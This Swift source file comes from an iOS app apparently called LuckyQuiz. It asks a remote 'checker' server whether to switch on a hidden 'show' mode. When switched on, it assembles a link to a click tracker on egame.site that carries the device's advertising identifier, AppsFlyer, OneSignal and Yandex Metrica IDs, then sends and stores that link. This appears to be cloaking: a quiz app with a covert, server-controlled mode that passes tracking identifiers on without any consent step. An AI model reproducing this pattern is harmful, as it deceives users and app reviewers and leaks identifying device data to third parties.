//
//  NewLogic.swift
//  LuckyQuiz
//
//  Created by Mark Vais on 11.11.2020.
//  Copyright © 2020 Mark Vais. All rights reserved.
//

import Foundation
import OneSignal
import AdSupport
import YandexMobileMetrica
import AppsFlyerLib

class Logic {
    
    var media_sources = [MediaSources]()
    var organic: OrganicData?
    var toShow: (d: String, n: String)?
    var version: String?
    
    func getDataFromChecker (url: URL, completion: @escaping (Response?) -> Void) {
        URLSession.shared.dataTask(with: url) { data, _, error in
            guard let jsonData = data else {
                print("Error getting jsonData")
                completion(nil)
                return
            }
            do {
                let decodedData = try JSONDecoder().decode(Response.self, from: jsonData)
                completion(decodedData)
            }
            catch {
                print(error)
                completion(nil)
            }
        }.resume()
    }
    
    func checkerDataUsage(completion: @escaping (String) -> ()) {
        let url = URL(string: "https://integr-testing.site/apps_v2/checker/?bundle=com.gb.luckyquizz")!
        getDataFromChecker(url: url) { result in
            guard let res = result else { print("Checker data is nil"); return }

            self.media_sources = res.media_sources
            self.organic = res.organic
            self.version = res.integration_version
            self.toShow = (res.deeplink, res.naming)
            
            completion(res.user)
        }
    }
    
    func requestData() {
        
        checkerDataUsage() { [self] status in
            
            if status != "true" { UserDefaults.standard.set("false", forKey: "show"); return }
            UserDefaults.standard.set("true", forKey: "show")
            
            let deep = "\(UserDefaults.standard.object(forKey: "deep") ?? "")"
            Utils().getDData(link: deep) { data -> () in
                if data != nil && toShow?.d == "true" {
                    formLinkFromResult(data!, status) { link in Utils().sendToServer(link) }
                    return
                }
                
                Utils().getNData(mediaSources: media_sources) { data -> () in
                    if data != nil && toShow?.n == "true" {
                        formLinkFromResult(data!, status) { link in Utils().sendToServer(link) }
                        return
                    }
                    
                    if (self.organic?.org_status == "true") {
                        let key = self.organic?.org_key ?? Consts.ORG_F
                        let sub1 = self.organic?.sub1 ?? "none"
                        let sub2 = self.organic?.sub2 ?? "none"
                        let sub3 = self.organic?.sub3 ?? "none"
                        
                        let organicData = ResultData(key: key, sub1: sub1, sub2: sub2, sub3: sub3, source: "none")
                        formLinkFromResult(organicData, status) { link in Utils().sendToServer(link) }
                    } else {
                        UserDefaults.standard.set("false", forKey: "show")
                    }
                }
            }
        }
    }
    
    func formLinkFromResult(_ data: ResultData, _ status: String, completion: @escaping (String) -> ()) {
        var link = "https://egame.site/click.php"
        
        link.append("?key=\(data.key)")
        link.append("&sub1=\(data.sub1)")
        
        if data.sub2 != nil && data.sub2 != "" { link.append("&sub2=\(data.sub2!)") }
        if data.sub3 != nil && data.sub3 != "" { link.append("&sub3=\(data.sub3!)") }
        
        let bundle = Bundle.main.bundleIdentifier ?? "com.gb.luckyquizz"
        let appsFlyerId = AppsFlyerTracker().getAppsFlyerUID()
        let ifa = ASIdentifierManager.shared().advertisingIdentifier
        let onesignal_id = OneSignal.getUserDevice()?.getUserId() ?? "none"
        let source = data.source
        var metrica_id = "none"
        YMMYandexMetrica.requestAppMetricaDeviceID(withCompletionQueue: DispatchQueue(label: "q")) { (str, error) in
            metrica_id = str ?? "none"
        }
        
        if version == "v1" {
            link.append("&sub4=\(bundle)")
            
            let sub5 = "\(source):\(ifa):\(appsFlyerId):\(metrica_id)"
            link.append("&sub5=\(sub5)")
            
        } else {
            link.append("&bundle=\(bundle)")
            link.append("&metrica_id=\(metrica_id)")
            link.append("&apps_id=\(appsFlyerId)")
            link.append("&ifa=\(ifa)")
            link.append("&onesignal_id=\(onesignal_id)")
            link.append("&source=\(source)")
        }
        
        print(link); completion(link)
        UserDefaults.standard.set(link, forKey: "url_link")
    }
}
